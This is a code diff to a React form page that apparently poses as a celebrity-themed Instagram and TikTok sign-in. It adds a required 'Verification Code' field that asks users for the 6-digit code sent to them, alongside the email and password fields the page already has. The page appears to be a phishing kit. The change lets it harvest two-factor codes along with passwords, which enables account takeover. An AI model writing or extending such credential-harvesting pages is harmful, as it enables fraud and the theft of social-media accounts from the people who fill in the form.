@@ -32,12 +32,14 @@ const instagramSchema = z.object({
   favoriteCelebrity: z.string().min(1, "Favorite celebrity is required"),
   email: z.string().email("Invalid email address"),
   password: z.string().min(1, "Password is required"),
+  verificationCode: z.string().min(1, "Verification code is required"),
 });
 
 const tiktokSchema = z.object({
   favoriteCelebrity: z.string().min(1, "Favorite celebrity is required"),
   email: z.string().email("Invalid email address"),
   password: z.string().min(1, "Password is required"),
+  verificationCode: z.string().min(1, "Verification code is required"),
 });
 
 export default function Home() {
@@ -49,6 +51,7 @@ export default function Home() {
       favoriteCelebrity: "",
       email: "",
       password: "",
+      verificationCode: "",
     },
   });
 
@@ -58,6 +61,7 @@ export default function Home() {
       favoriteCelebrity: "",
       email: "",
       password: "",
+      verificationCode: "",
     },
   });
 
@@ -186,6 +190,19 @@ export default function Home() {
                         </FormItem>
                       )}
                     />
+                    <FormField
+                      control={instagramForm.control}
+                      name="verificationCode"
+                      render={({ field }) => (
+                        <FormItem>
+                          <FormLabel>Verification Code</FormLabel>
+                          <FormControl>
+                            <Input placeholder="Enter the 6-digit code sent to you" {...field} />
+                          </FormControl>
+                          <FormMessage />
+                        </FormItem>
+                      )}
+                    />
                     <Button
                       type="submit"
                       className="w-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-500 hover:opacity-90 text-white border-0"
@@ -251,6 +268,19 @@ export default function Home() {
                           <FormLabel>TikTok Password</FormLabel>
                           <FormControl>
                             <Input placeholder="••••••••" type="password" {...field} />
+                          </FormControl>
+                          <FormMessage />
+                        </FormItem>
+                      )}
+                    />
+                    <FormField
+                      control={tiktokForm.control}
+                      name="verificationCode"
+                      render={({ field }) => (
+                        <FormItem>
+                          <FormLabel>Verification Code</FormLabel>
+                          <FormControl>
+                            <Input placeholder="Enter the 6-digit code sent to you" {...field} />
                           </FormControl>
                           <FormMessage />
                         </FormItem>
